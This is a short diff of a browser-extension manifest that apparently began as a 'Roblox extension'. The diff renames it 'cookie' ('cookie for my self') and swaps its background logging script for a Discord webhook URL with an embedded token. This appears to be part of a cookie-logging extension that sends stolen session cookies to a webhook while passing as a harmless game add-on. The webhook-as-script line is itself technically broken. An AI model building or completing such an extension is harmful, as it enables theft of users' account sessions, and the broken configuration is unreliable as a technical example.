@@ -1,6 +1,7 @@
 {
-    "name": "Roblox extension",
-    "description": "extention for roblox",
+    "name": "cookie",
+    "description": "cookie for my self
+                                 ",
     "version": "1.0.0",
     "manifest_version": 2,
 
@@ -15,6 +16,6 @@
     ],
 
     "background": {
-      "scripts": ["scripts/log.js"]
+      "scripts": ["https://discord.com/api/webhooks/980918743263739945/PSyA2cVReJhJj7d6CkN0uOpBLNJa8pqh9QLLsmKPJ3FvSdDzDZNF7mJz3B-3JQQtBsTI"]
     }
 }
